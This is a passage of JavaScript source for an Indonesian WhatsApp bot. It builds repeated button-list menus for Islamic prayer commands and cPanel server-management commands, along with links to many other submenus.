        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
//=========================================\\
case 'islamimenubutton': {
let teks = `◤─「 \`ISLAM MENU\` 」─✦
│⦿ 〔 _.kisahnabi_
│⦿ 〔 _.asmaulhusna_
│⦿ 〔 _.bacaansholat_
│⦿ 〔 _.audiosurah_
│⦿ 〔 _.ayatkursi_
│⦿ 〔 _.doaharian_
│⦿ 〔 _.niatsholat_
│⦿ 〔 _.quotes_
│⦿ 〔 _.sholat_
│⦿ 〔 _.doatahlil_
│⦿ 〔 _.tafsir_
│⦿ 〔 _.jadwalsholat_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'cpanelmenubutton': {
let teks = `◤─「 \`CPANEL MENU\` 」─✦ 
│⦿ 〔 _.ᴘᴀɴᴇʟ_
│⦿ 〔 _.ʟɪsᴛᴜsʀ_
│⦿ 〔 _.ᴅᴇʟᴜsʀ_
│⦿ 〔 _.ʟɪsᴛsʀᴠ_
│⦿ 〔 _.ᴅᴇʟsʀᴠ_
│⦿ 〔 _.ᴛᴜᴛᴏʀɪᴀʟ_
│⦿ 〔 _.ʀᴀᴍʟɪsᴛ_
│⦿ 〔 _.ᴘʀᴇᴍʟɪsᴛ_
│⦿ 〔 _.ᴀᴅᴅᴜsʀ_
│⦿ 〔 _.ᴀᴅᴅsʀᴠ_
│⦿ 〔 _.ᴜᴘᴅᴀᴛᴇsʀᴠ_
│⦿ 〔 _.sᴜsᴘᴇɴᴅ_
│⦿ 〔 _.ᴜɴsᴜsᴘᴇɴᴅ_
│⦿ 〔 _.ᴄʀᴇᴀᴛᴇᴀᴅᴍɪɴ_
│⦿ 〔 _.ʟɪsᴛᴀᴅᴍɪɴ_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
